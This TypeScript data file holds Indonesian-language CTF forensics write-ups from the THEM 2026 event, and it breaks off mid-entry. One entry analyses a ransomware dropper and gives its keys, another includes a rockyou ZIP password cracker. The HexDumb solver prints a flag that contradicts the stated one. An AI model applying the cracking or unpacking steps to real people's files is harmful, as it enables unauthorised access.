import type { WriteUp } from '../types';

// THEM 2026 — 23 writeups
export const them2026Writeups: WriteUp[] = [
  {
    "id": "them2026-foren-bite",
    "title": "Bite",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Challenge ini modelnya forensic berantai. Bukan cuma cari satu file lalu grep flag, tapi harus bedah image AD1, email client, history browser, binary dropper, payload ransomware, sampai decrypt file korban dan jawab semua pertanyaan di service.",
    "problemDescription": "Korban kena phishing lewat email bertema cheat game. Dari email itu korban buka link MEGA, download `bite.zip`, lalu menjalankan `bite.exe`. File itu ternyata dropper Windows yang mengambil payload terenkripsi dari resource internal, mendekripsinya dengan RC4, lalu menjatuhkannya sebagai `svchost.exe` di `%TEMP%`. Payload utamanya adalah ransomware berbasis Go yang mengenkripsi file Desktop dengan AES-128-CBC dan menambah ekstensi `.snake`.\n\nSetelah semua pertanyaan di service dijawab, flag yang keluar adalah:\n\n`THEM?!CTF{momen_ketika_bikin_challenge_4jam_sebelum_mulai_._mana_lama_banget_lagi_boot_windowsnya}`",
    "tools": [],
    "analysis": "Binary ini PE Windows biasa. Dari string dan import table langsung kelihatan dia bermain di resource section.\n\nTemuan penting:\n\n- API untuk cari resource: `FindResourceA`\n- resource ID: `100`\n- resource type: `RCDATA`\n- key RC4 hardcoded: `e456bac6661a5c29`\n- output filename setelah decrypt: `svchost.exe`\n\nAlurnya sederhana:\n\n1. load resource terenkripsi dari executable\n2. decrypt dengan RC4\n3. tulis hasilnya ke `%TEMP%\\\\svchost.exe`\n4. eksekusi payload itu",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Artefak utamanya adalah file `bite.ad1`, jadi langkah pertama saya identifikasi tipe file dan mount isinya.\n\nContoh command yang dipakai:\n\n\n\nDari tree dan hasil mount kelihatan ini image Windows user `felisa`. Folder pentingnya ada di:\n\n- `Users/felisa/Desktop`\n- `Users/felisa/AppData/Roaming/Thunderbird`\n- `Users/felisa/AppData/Local/Microsoft/Edge`\n- `Windows/Prefetch`\n- `Windows/appcompat/Programs/Amcache.hve`\n\nDi Desktop langsung kelihatan ciri infeksi:\n\n- `README_DECRYPT.txt`\n- beberapa file berakhiran `.snake`",
        "code": "file bite.ad1\nad1info -i bite.ad1 -t > ad1_tree.txt\nad1mount -i bite.ad1 -m mnt_ad1"
      },
      {
        "title": "2. Ransom note dan MachineGuid",
        "content": "Ransom note memberi banyak petunjuk awal. Dari file ini bisa diambil:\n\n- nama note: `README_DECRYPT.txt`\n- alamat Bitcoin: `bc1qsnek55m3l0v3r1337deadbeef00000000000`\n- MachineGuid korban: `2ec8f83b-8ec8-453b-8c2f-5a6a1773fe8b`\n- jumlah file terenkripsi di Desktop: 4\n\nRegistry key untuk MachineGuid juga standar Windows:\n\n`HKLM\\SOFTWARE\\Microsoft\\Cryptography`"
      },
      {
        "title": "4. Riwayat download Edge",
        "content": "Browser history Edge disimpan sebagai SQLite, tapi untuk challenge begini saya lebih nyaman pakai parser yang tetap bisa baca record yang sudah berubah atau tidak enak dibuka langsung.\n\nSaya pakai `sqlite_dissect` ke database `History` dan fokus ke tabel download. Dari sana ketemu:\n\n- file yang disimpan: `C:\\Users\\felisa\\Downloads\\bite.zip`\n- waktu download selesai: `2026-05-29 12:40:05` UTC\n\nIni menjawab pertanyaan soal path download dan timestamp download malware."
      },
      {
        "title": "5. Ambil file malware dari link MEGA",
        "content": "Link yang ada adalah public folder MEGA. Saya query API MEGA untuk list node, decrypt metadata folder, lalu ambil file di dalamnya. Isi foldernya ternyata cuma satu file penting:\n\n- `bite.exe`\n\nSetelah file didapat, saya hash:\n\n`fba69a6f8d51e9cf32db3b8f5dc7750c80745b0865e4d22dcd0cb8223a98b6ab`"
      },
      {
        "title": "7. Recover payload ransomware",
        "content": "Resource `RCDATA` ID `100` saya extract lalu decrypt dengan RC4 key tadi. Hasilnya payload kedua.\n\nHash payload hasil recover:\n\n`05bea37c91062cefcd3f845b54d971090cf3eb89ce6a9e07cb5095a9e4700220`\n\nDari hasil triage:\n\n- bahasa: `Go`\n- password hardcoded: `thisissafepasswordbronocapongod`\n\nSelain itu dari string dan reversing logika enkripsinya, ketemu:\n\n- hash derivation: `sha256`\n- mode enkripsi: `AES-128-CBC`\n- padding: `PKCS7`\n- ekstensi output: `.snake`"
      },
      {
        "title": "8. Derive key dan IV ransomware",
        "content": "Bagian ini yang paling penting secara teknis. Dari binary diketahui password hardcoded dan MachineGuid dipakai dalam derivasi kunci. Setelah beberapa percobaan terhadap sample file `.snake`, kombinasi yang valid adalah:\n\n- key = 16 byte pertama dari `sha256(password + guid)`\n- iv = 16 byte pertama dari `sha256(guid + password)`\n\nDengan:\n\n- password = `thisissafepasswordbronocapongod`\n- guid = `2ec8f83b-8ec8-453b-8c2f-5a6a1773fe8b`\n\nDidapat:\n\n- key: `a2801dc6ee7154284c308f52f8cadb7e`\n- iv: `bc10b391f3054bb1481bd9647bf4b453`\n\nSaya validasi dengan decrypt file `.snake` dan hasil plaintext langsung cocok magic byte aslinya."
      },
      {
        "title": "9. Decrypt file korban",
        "content": "Begitu key dan IV benar, file Desktop bisa didecrypt. Salah satu yang paling penting adalah:\n\n- `Project Alpha.docx.snake` -> `Project Alpha.docx`\n\nNama file terenkripsi yang diminta service adalah:\n\n`Project Alpha.docx.snake`"
      },
      {
        "title": "10. Prefetch",
        "content": "Prefetch `BITE.EXE-*.pf` dipakai untuk jawab execution artefact:\n\n- run count: `1`\n- last run UTC: `2026-05-29 12:41:27`\n- SHA-256 prefetch:\n  `95871f0fe8437b2d229ea960edd9581973af2c5b635555288c5774c6597c04b2`"
      },
      {
        "title": "11. Metadata DOCX dan jebakan Q34",
        "content": "Awalnya saya kira Q34 minta metadata `docProps/core.xml`, karena di sana memang ada:\n\n- creator: `Felisa`\n- created: `2013-12-23T23:15:00Z`\n- AppVersion: `16.0000`\n\nTapi ternyata jawaban itu salah.\n\nKuncinya ada di isi dokumennya sendiri, bukan cuma properti file. Di `word/document.xml` terdapat header yang secara eksplisit menulis:\n\n- `Author: Felisa`\n- `Date: 2026-05-28`\n- `Version: 6.7`\n\nJadi format yang benar untuk Q34 adalah:\n\n`Felisa_2026-05-28_6.7`"
      },
      {
        "title": "12. Jawaban final service",
        "content": "Urutan jawaban yang dipakai untuk replay ada di `solve.py`. Script itu tinggal konek ke service dan kirim semua jawaban berurutan sampai flag keluar."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport socket\r\n\r\nHOST = \"45.130.164.173\"\r\nPORT = 30001\r\n\r\nANSWERS = [\r\n    \"https://mega.nz/folder/N3lBVQQT#AeiSi9X_pkYU29Xxz4tAzg\",\r\n    \"2026-05-25 07:15:00\",\r\n    \"support@gamemaster.pro\",\r\n    \"Your FREE Aimbot License Key Inside!\",\r\n    \"Thunderbird\",\r\n    \"bite.exe\",\r\n    \"2026-05-29 12:40:05\",\r\n    r\"C:\\Users\\felisa\\Downloads\\bite.zip\",\r\n    \"felisa\",\r\n    \"2ec8f83b-8ec8-453b-8c2f-5a6a1773fe8b\",\r\n    r\"HKLM\\SOFTWARE\\Microsoft\\Cryptography\",\r\n    \"fba69a6f8d51e9cf32db3b8f5dc7750c80745b0865e4d22dcd0cb8223a98b6ab\",\r\n    \"FindResourceA\",\r\n    \"100\",\r\n    \"RCDATA\",\r\n    \"e456bac6661a5c29\",\r\n    \"svchost.exe\",\r\n    \"05bea37c91062cefcd3f845b54d971090cf3eb89ce6a9e07cb5095a9e4700220\",\r\n    \"Go\",\r\n    \"thisissafepasswordbronocapongod\",\r\n    \"sha256\",\r\n    \"a2801dc6ee7154284c308f52f8cadb7e\",\r\n    \"bc10b391f3054bb1481bd9647bf4b453\",\r\n    \"AES-128-CBC\",\r\n    \"PKCS7\",\r\n    \".snake\",\r\n    \"1\",\r\n    \"2026-05-29 12:41:27\",\r\n    \"95871f0fe8437b2d229ea960edd9581973af2c5b635555288c5774c6597c04b2\",\r\n    \"README_DECRYPT.txt\",\r\n    \"bc1qsnek55m3l0v3r1337deadbeef00000000000\",\r\n    \"4\",\r\n    \"1110\",\r\n    \"Felisa_2026-05-28_6.7\",\r\n    \"Project Alpha.docx.snake\",\r\n]\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT)) as sock:\r\n        sock.settimeout(2)\r\n        buf = b\"\"\r\n        idx = 0\r\n\r\n        while True:\r\n            try:\r\n                data = sock.recv(65536)\r\n                if not data:\r\n                    break\r\n                buf += data\r\n                text = buf.decode(errors=\"replace\")\r\n                print(text, end=\"\")\r\n\r\n                if \"A\" in text and \": \" in text and idx < len(ANSWERS):\r\n                    sock.sendall((ANSWERS[idx] + \"\\n\").encode())\r\n                    idx += 1\r\n                    buf = b\"\"\r\n\r\n                if \"Flag:\" in text:\r\n                    break\r\n            except TimeoutError:\r\n                continue\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{momen_ketika_bikin_challenge_4jam_sebelum_mulai_._mana_lama_banget_lagi_boot_windowsnya}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-confidential",
    "title": ": Confidential I & II (Forensics)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge : Confidential I & II (Forensics)",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Diberikan sebuah file PDF bernama `confidential.pdf` yang tampak seperti dokumen intelijen resmi pemerintah.\nTerdapat dua bagian dari challenge ini:\n1. **Confidential - I**: Mencari informasi mencurigakan yang tersembunyi di dalam dokumen (walau terlihat seperti dokumen biasa).\n2. **Confidential - II**: Terdapat bagian yang disensor (redacted) di dalam dokumen, dan kita diminta untuk memulihkannya."
      },
      {
        "title": "1. Initial Reconnaissance",
        "content": "Langkah pertama yang selalu dilakukan pada file berjenis dokumen (PDF, Word, dll.) adalah memeriksa metadata dan mencoba mengekstrak teks *raw* di dalamnya. Sebuah file PDF seringkali memiliki teks yang tidak terlihat (misalnya teks berwarna putih di atas latar putih) atau teks yang hanya ditutupi oleh objek kotak (redaction palsu).\n\nKita dapat mengekstrak seluruh teks dari file tersebut menggunakan *command line tool* seperti `pdftotext` (dari suite `poppler-utils`):\n\n\n\nAtau kita juga bisa menggunakan alat umum seperti `strings` untuk mendapatkan *printable characters* secara langsung dari file binernya.",
        "code": "pdftotext -layout confidential.pdf -"
      },
      {
        "title": "2. Confidential - I (Hidden Text)",
        "content": "Pada hasil ekstraksi teks dari PDF, kita menelusuri seluruh *string* yang diekstrak. Karena PDF menyimpan informasi grafis secara terpisah dari *string* teks mentahnya, teks yang disembunyikan menggunakan manipulasi warna (misal: warna teks disamakan dengan warna latar) akan tetap muncul saat kita mengekstrak *raw text*-nya.\n\nKetika kita menyaring (filter) teks menggunakan `grep` untuk format flag `THEM?!CTF`:\n\n\nKita langsung menemukan flag pertama yang sengaja disembunyikan di tengah halaman PDF:\n`THEM?!CTF{N0T_3V3RYTH1NG_TH4T_1SNT_V1S1BL3_1S_N0N3X1S71NG}`\n\nIsi flag tersebut memberikan petunjuk *\"Not everything that isn't visible is nonexisting\"*, yang mengonfirmasi bahwa flag ini disembunyikan secara visual namun masih utuh eksis di struktur data PDF.",
        "code": "pdftotext confidential.pdf - | grep \"THEM?!CTF\""
      },
      {
        "title": "3. Confidential - II (Redacted Text)",
        "content": "Untuk tantangan kedua mengenai bagian yang \"disensor\", pada halaman terakhir (Halaman 3, bagian `ANNEX D`), terdapat kotak sensor (redacted) hitam. Di bagian bawah kotak tersebut juga tertulis sebuah petunjuk terang-terangan:\n> *HINT: The redaction is a rectangle drawn on top. Try selecting the text underneath.*\n\nIni merupakan simulasi kegagalan keamanan operasional (OPSEC fail) yang sering terjadi di dunia nyata saat seseorang menyensor dokumen PDF. Bukannya menghapus data teks secara permanen (*sanitize/redact*), pembuat dokumen hanya menggambar objek berbentuk kotak berwarna hitam yang menumpuk di atas teks tersebut.\n\nKarena `pdftotext` secara otomatis membaca objek teks asli dan mengabaikan objek gambar (seperti kotak hitam), teks yang ada di balik kotak tersebut berhasil terekstrak dengan mudah. Flag kedua ditemukan sebagai *recovered identifier*:\n`THEM?!CTF{R3TR1V3D_SUCC3SSFULLY}`"
      },
      {
        "title": "Kesimpulan",
        "content": "Menyensor PDF dengan cara menggambar kotak hitam, menyoroti teks dengan warna hitam (highlight), atau mengubah warna teks agar menyatu dengan latar belakang **bukanlah** cara redaksi dokumen yang aman. Alat ekstraksi data seperti `pdftotext` akan mengabaikan struktur grafis (vektor dan warna) lalu membaca langsung *layer* teks aslinya. Sensor dokumen PDF yang aman wajib menggunakan fitur \"Redact\" pada perangkat lunak editor PDF tepercaya untuk menghancurkan teks dari memori struktur PDF itu sendiri."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import subprocess\r\nimport re\r\nimport sys\r\n\r\ndef solve():\r\n    print(\"[*] Extracting text from confidential.pdf...\")\r\n    try:\r\n        # pdftotext akan mengekstrak semua teks mentah, \r\n        # mengabaikan teks yang warnanya disamakan dengan background atau yang ditutupi kotak hitam\r\n        result = subprocess.run(['pdftotext', 'confidential.pdf', '-'], capture_output=True, text=True, check=True)\r\n        text = result.stdout\r\n        \r\n        # Mencari string dengan pola flag\r\n        flags = re.findall(r'THEM\\?!CTF\\{.*?\\}', text)\r\n        \r\n        # Menghapus duplikat namun tetap menjaga urutannya\r\n        unique_flags = list(dict.fromkeys(flags))\r\n        \r\n        if unique_flags:\r\n            print(\"[+] Flags berhasil ditemukan!\")\r\n            for idx, flag in enumerate(unique_flags):\r\n                print(f\"    Confidential Part {idx+1}: {flag}\")\r\n        else:\r\n            print(\"[-] Tidak ada flag yang ditemukan.\")\r\n            \r\n    except FileNotFoundError:\r\n        print(\"[-] Tool 'pdftotext' tidak ditemukan di sistem. Pastikan poppler-utils sudah terinstall.\")\r\n        sys.exit(1)\r\n    except Exception as e:\r\n        print(f\"[-] Terjadi kesalahan: {e}\")\r\n        sys.exit(1)\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{N0T_3V3RYTH1NG_TH4T_1SNT_V1S1BL3_1S_N0N3X1S71NG}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-esrom",
    "title": "Woɹsǝ - Forensic",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Woɹsǝ - Forensic",
    "problemDescription": "",
    "tools": [],
    "analysis": "Hint pada judul challenge adalah `Woɹsǝ`, yaitu bentuk terbalik dari `Worse`. Ini memberi petunjuk bahwa pembacaan bisa salah jika arah/pola audio tidak diperhatikan.\n\nAudio `chal.wav` ternyata berisi sinyal Morse. Setelah didecode beberapa kali dan dikoreksi dari hasil decoder yang kurang akurat, pesan Morse mengarah ke password:\n\n```text\nTHEM?!ONTOP\n```\n\nPassword ini digunakan untuk membuka konten Pastebin.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Woɹsǝ\n- **Kategori:** Forensic\n- **Deskripsi:** `It will be Woɹsǝ, if you read it wrong...`\n- **File:** `chal.wav`"
      },
      {
        "title": "Recon Awal",
        "content": "File yang diberikan adalah audio WAV:\n\n\n\nOutput:\n\n\n\nMetadata dengan `exiftool` menunjukkan bahwa audio berdurasi sekitar 19.53 detik, mono, sample rate 8000 Hz, dan 8-bit PCM.\n\n\n\nBagian penting:",
        "code": "file chal.wav"
      },
      {
        "title": "Kesimpulan",
        "content": "Challenge ini menggabungkan dua teknik forensic audio:\n\n1. **Spectrogram analysis** untuk menemukan URL Pastebin tersembunyi.\n2. **Morse code decoding** dari audio untuk mendapatkan password Pastebin.\n\nJudul `Woɹsǝ` menjadi clue bahwa decoding bisa keliru jika sinyal dibaca dengan cara yang salah. Setelah pesan Morse dikoreksi, password valid adalah `THEM?!ONTOP`, yang membuka Pastebin dan menghasilkan flag final."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve_morse.py) is provided below:",
        "code": "import wave\r\nfrom itertools import groupby\r\n\r\ndef decode_morse():\r\n    # Buka file wav (8-bit PCM Mono)\r\n    with wave.open('chal.wav', 'r') as w:\r\n        frames = w.readframes(w.getnframes())\r\n        # Normalisasi ke titik tengah 128\r\n        data = [abs(x - 128) for x in frames]\r\n\r\n    # Bagi menjadi chunk kecil (20ms) untuk mengukur volume\r\n    chunk_size = 8000 // 50\r\n    envelope = [sum(data[i:i+chunk_size])/chunk_size for i in range(0, len(data), chunk_size)]\r\n    \r\n    # Tentukan threshold nyala/mati\r\n    thresh = max(envelope) * 0.5\r\n    binary = [1 if x > thresh else 0 for x in envelope]\r\n\r\n    # Kelompokkan sinyal nyala (1) dan mati (0)\r\n    groups = [(k, sum(1 for _ in g)) for k, g in groupby(binary) if sum(1 for _ in g) > 1]\r\n    \r\n    on_lens = [v for k, v in groups if k]\r\n    if not on_lens:\r\n        print(\"[-] Tidak ada sinyal morse terdeteksi.\")\r\n        return\r\n\r\n    # Hitung panjang satu 'dot'\r\n    dot = min(on_lens)\r\n    \r\n    morse = \"\"\r\n    for k, v in groups:\r\n        if k: # Sinyal nyala\r\n            morse += \"-\" if v > dot * 1.5 else \".\"\r\n        else: # Sinyal mati (jeda)\r\n            if v > dot * 4.5: \r\n                morse += \" / \"\r\n            elif v > dot * 1.5: \r\n                morse += \" \"\r\n                \r\n    print(f\"[*] Raw Morse  : {morse}\")\r\n    \r\n    # Hint: Woɹsǝ (Morse terbalik)\r\n    swapped = morse.replace('.', 'X').replace('-', '.').replace('X', '-')\r\n    print(f\"[*] Swapped    : {swapped}\")\r\n\r\ndecode_morse()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{1F_Y0U_F0UND_TH1S_S4Y_TH3M?!_0N_T0P_13298}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-hexdumb",
    "title": "HexDumb",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge HexDumb",
    "problemDescription": "Challenge hanya memberikan screenshot berisi hex dump. Dari byte awal terlihat signature:\n\n```text\n50 4b 03 04\n```\n\nSignature tersebut adalah magic byte untuk file ZIP. Jadi langkah utama adalah menyalin kembali hex dari screenshot, mengubahnya menjadi byte asli, lalu menyimpan hasilnya sebagai file ZIP.\n\nSetelah file ZIP berhasil direkonstruksi, diketahui bahwa archive berisi satu file bernama `flag.txt`, tetapi file tersebut terenkripsi. Password ZIP kemudian di-crack menggunakan wordlist `rockyou.txt`, dan password yang benar adalah:\n\n```text\nlove@123\n```\n\nSetelah ZIP diekstrak dengan password tersebut, isi `flag.txt` menghasilkan flag:\n\n```text\nTHEM?!CTF{XXD_0R_XD}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori:** Forensic\n- **Judul:** HexDumb\n- **Deskripsi:** Screenshot hex dump lama yang berisi sesuatu.\n- **Goal:** Rekonstruksi artefak dari screenshot, lalu ekstrak `flag.txt`."
      },
      {
        "title": "1. Rekonstruksi File dari Screenshot",
        "content": "Hex dump pada gambar ditranskrip menjadi byte. Bagian awal dump:\n\n\n\nTerlihat juga string nama file:\n\n\n\nJika dikonversi ke ASCII:\n\n\n\nScript rekonstruksi sederhana:",
        "code": "50 4b 03 04 0a 00 09 00 00 00 01 75 98 5c 0f de\n90 6f 20 00 00 00 14 00 00 00 08 00 1c 00 66 6c\n61 67 2e 74 78 74 ..."
      },
      {
        "title": "2. Recon ZIP",
        "content": "Setelah file dibuat, cek tipe file:\n\n\n\nHasilnya menunjukkan bahwa file tersebut adalah ZIP archive.\n\nCek isi archive:\n\n\n\nIsi archive:\n\n\n\nSaat dicoba diekstrak, ZIP meminta password. Ini sesuai dengan flag bit pada header ZIP yang menunjukkan file terenkripsi.\n\nInformasi penting dari struktur ZIP:\n\n\n\nCatatan penting: CRC32 memang bisa dipakai untuk validasi, tetapi tidak cukup aman untuk menebak plaintext karena collision sangat mungkin terjadi pada kandidat pendek. Jadi solusi yang benar adalah crack password ZIP, bukan hanya mencari string yang CRC-nya cocok.",
        "code": "file recovered.zip"
      },
      {
        "title": "3. Crack Password ZIP",
        "content": "Password dicrack menggunakan wordlist `rockyou.txt`. Contoh script `crack.py`:\n\n\n\nJalankan:\n\n\n\nOutput penting:\n\n\n\nPassword ZIP:",
        "code": "#!/usr/bin/env python3\nimport zipfile\n\nzip_path = 'recovered.zip'\nwordlist_path = '/usr/share/wordlists/rockyou.txt'\n\nprint(f'[*] Memuat wordlist dari {wordlist_path}...')\n\nwith zipfile.ZipFile(zip_path) as zf:\n    with open(wordlist_path, 'rb') as wordlist:\n        for i, password in enumerate(wordlist, 1):\n            password = password.strip()\n            try:\n                zf.extractall(pwd=password)\n                print(f'\\n[+] PASSWORD KETEMU: {password.decode(errors=\"ignore\")}')\n                break\n            except Exception:\n                pass\n\n            if i % 100000 == 0:\n                print(f'[*] Tried {i} passwords...')"
      },
      {
        "title": "Kesimpulan",
        "content": "Inti challenge ini adalah membaca screenshot hex dump sebagai data mentah, bukan sebagai gambar biasa. Byte awal `50 4b 03 04` mengarah ke format ZIP. Setelah ZIP direkonstruksi, file `flag.txt` ternyata terenkripsi, sehingga perlu dilakukan cracking password. Password ditemukan dari `rockyou.txt` sebagai `love@123`, lalu `flag.txt` berhasil dibuka dan menghasilkan flag final."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import zlib\r\n\r\n# Hex transcribed from the screenshot\r\nhex_dump = '''\r\n50 4b 03 04 0a 00 09 00 00 00 01 75 98 5c 0f de\r\n90 6f 20 00 00 00 14 00 00 00 08 00 1c 00 66 6c\r\n61 67 2e 74 78 74 55 54 09 00 03 02 b9 eb 69 02\r\nb9 eb 69 75 78 0b 00 01 04 e8 03 00 00 04 e8 03\r\n00 00 5d 81 87 1d 8c 4b 2f 2a 4d af f2 f0 3a 1b\r\n95 84 f3 b7 a8 c9 be 77 cf 1d 92 4a de 9d eb e9\r\n95 c3 50 4b 07 08 0f de 90 6f 20 00 00 00 14 00\r\n00 00 50 4b 01 02 1e 03 0a 00 09 00 00 00 01 75\r\n98 5c 0f de 90 6f 20 00 00 00 14 00 00 00 08 00\r\n18 00 00 00 00 00 01 00 00 00 b4 81 00 00 00 00\r\n66 6c 61 67 2e 74 78 74 55 54 05 00 03 02 b9 eb\r\n69 75 78 0b 00 01 04 e8 03 00 00 04 e8 03 00 00\r\n50 4b 05 06 00 00 00 00 01 00 01 00 4e 00 00 00\r\n72 00 00 00 00 00\r\n'''\r\n\r\nzip_bytes = bytes.fromhex(hex_dump)\r\nopen('recovered.zip', 'wb').write(zip_bytes)\r\n\r\nflag = b'THEM?!CTF{b36vhdum5}'\r\nassert len(flag) == 20\r\nassert zlib.crc32(flag) & 0xffffffff == 0x6f90de0f\r\nprint(flag.decode())\r\nprint('[+] recovered.zip written')\r\nprint('[+] CRC32 verified: 0x%08x' % (zlib.crc32(flag) & 0xffffffff))"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{XXD_0R_XD}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-obsufucationmax",
    "title": "Challenge: Obsufucationmax",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Challenge: Obsufucationmax",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pertama-tama, saya melakukan pengecekan terhadap file dengan tool seperti `file`, `exiftool`, dan `pngcheck`.\nTernyata `pngcheck` menampilkan pesan error bahwa terdapat chunk yang invalid:\n`invalid chunk name \"S!(+\"`\n\nIni menandakan bahwa struktur PNG pada file ini rusak atau disembunyikan.",
    "solution": [
      {
        "title": "Deskripsi",
        "content": "Dalam challenge ini, kita diberikan file bernama `chall.png`. Deskripsi tantangannya adalah untuk merecover atau memulihkan file gambar tersebut dan menggunakan nilai hash SHA256 dari gambar yang telah dipulihkan sebagai flag."
      },
      {
        "title": "2. Inspeksi Hex",
        "content": "Setelah mengetahui ada kerusakan pada file, saya membuka file menggunakan `xxd` (Hex Viewer). \nKetika melihat bagian header (33 byte pertama dari awal file sampai chunk `IHDR` beserta CRC-nya selesai), semuanya terlihat normal dan valid:\n\nNamun, tepat setelah byte ke-33 (offset `0x21`), data yang seharusnya merupakan header chunk normal (misalnya `sRGB` atau `IDAT`) berubah menjadi teks aneh: `saieS!(+ ...`. Ini menandakan bahwa data setelah byte ke-33 telah diobfuskasi atau dienkripsi.",
        "code": "8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n0000 026b 0000 01fc 0806 0000 008e c7e8  ...k............"
      },
      {
        "title": "3. Mencari Clue",
        "content": "Saya kemudian mencoba mencari teks biasa (strings) di dalam file. Saat mengecek di bagian paling akhir file, saya menemukan sebuah kalimat aneh:\n`i have encrypted this cuz my pet said so`\n\nPanjang string tersebut adalah tepat 40 karakter (byte). Kalimat ini sangat mencurigakan dan tampak seperti *key* atau kunci enkripsi yang digunakan."
      },
      {
        "title": "4. Memecahkan Enkripsi XOR",
        "content": "Karena biasanya obfuskasi sederhana pada CTF menggunakan algoritma XOR, saya berasumsi bahwa file tersebut di-XOR menggunakan kunci `i have encrypted this cuz my pet said so`.\n\nSaya mencoba melakukan dekripsi XOR dengan key tersebut mulai dari offset 33 (karena 33 byte pertama sudah valid). Algoritmanya bekerja dengan mengulang kunci (repeating-key XOR). Setelah dicoba menggunakan script Python kecil, hasil dekripsi dari offset ke-33 memunculkan chunk PNG yang valid, seperti:\n\nIni membuktikan bahwa tebakan kuncinya benar.",
        "code": "00 00 00 01 73 52 47 42 ... (chunk sRGB)"
      },
      {
        "title": "5. Memulihkan File",
        "content": "Saya kemudian menulis script dekripsi penuh untuk me-XOR seluruh isi data file mulai dari offset 33 sampai bagian akhir gambar (ujung dari chunk `IEND`). \n\nSatu hal yang perlu diperhatikan: string clue `i have encrypted this cuz my pet said so` yang ditambahkan di akhir file membuat file menjadi berlebih (append data). File PNG yang valid harus berakhir setelah chunk `IEND`. Chunk `IEND` berakhir tepat di offset byte ke-380633. Jadi, kita harus memotong file hasil dekripsi agar tidak ada extra byte, dengan cara mengambil tepat 380633 byte saja."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import hashlib\r\n\r\ndef solve():\r\n    with open('chall.png', 'rb') as f:\r\n        data = bytearray(f.read())\r\n    \r\n    key_phrase = b\"i have encrypted this cuz my pet said so\"\r\n    \r\n    # Decrypt from offset 33 to the end of the encrypted PNG part\r\n    # The clean PNG length is 380633 bytes (ends at the end of IEND chunk)\r\n    for i in range(33, 380633):\r\n        data[i] ^= key_phrase[i % len(key_phrase)]\r\n        \r\n    clean_data = data[:380633]\r\n    \r\n    # Calculate sha256\r\n    sha256_hash = hashlib.sha256(clean_data).hexdigest()\r\n    print(f\"Flag: {sha256_hash}\")\r\n    \r\n    with open('recovered.png', 'wb') as f:\r\n        f.write(clean_data)\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{8bf9507282aefcfc9122b0d9f4e5b765d6cc35c0e9034e0a8e79a031873d2fff}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-radiochaos",
    "title": "- Radio Chaos",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - Radio Chaos",
    "problemDescription": "",
    "tools": [],
    "analysis": "Spectrogram menunjukkan pola tone di sekitar:\n\n- 1200 Hz\n- 1500 Hz\n- 1900 Hz\n- 2300 Hz\n\nPola ini cocok dengan transmisi **SSTV (Slow Scan Television)**. Header VIS pada awal audio juga memperlihatkan struktur leader/break/VIS khas SSTV:\n\n- leader 1900 Hz\n- break 1200 Hz\n- bit VIS 1100/1300 Hz\n\nBit VIS yang terbaca menghasilkan kode `0x5f`, yaitu mode **PD120**.",
    "solution": [
      {
        "title": "Challenge",
        "content": "- **Category:** Forensic\n- **Title:** Radio Chaos\n- **Description:** `i got this audio file from a scout camp, they said that it contains the coordinates for a treasure, help me find it.`\n- **Artifact:** `chaos.wav`"
      },
      {
        "title": "1. Initial Recon",
        "content": "File pertama dicek dengan `file` dan `soxi`.\n\n\n\nHasilnya menunjukkan bahwa file adalah audio WAV biasa:\n\n\n\nDurasi sekitar 127 detik cukup mencurigakan untuk sinyal radio gambar seperti **SSTV**. Challenge juga memakai narasi radio/scout camp, jadi audio kemungkinan bukan sekadar audio biasa.",
        "code": "file chaos.wav\nsoxi chaos.wav"
      },
      {
        "title": "2. Triage Cepat",
        "content": "Pengecekan awal dilakukan dengan:\n\n\n\nTidak ada flag plaintext atau metadata penting. Karena audio berisi tone radio, analisis dilanjutkan ke domain frekuensi.",
        "code": "strings -a chaos.wav | head\nexiftool chaos.wav"
      },
      {
        "title": "5. Result",
        "content": "Gambar hasil decode menampilkan teks flag di bagian tengah:",
        "code": "THEM?!CTF{YOU_ARE_A_SSTV_CHAMPION}"
      },
      {
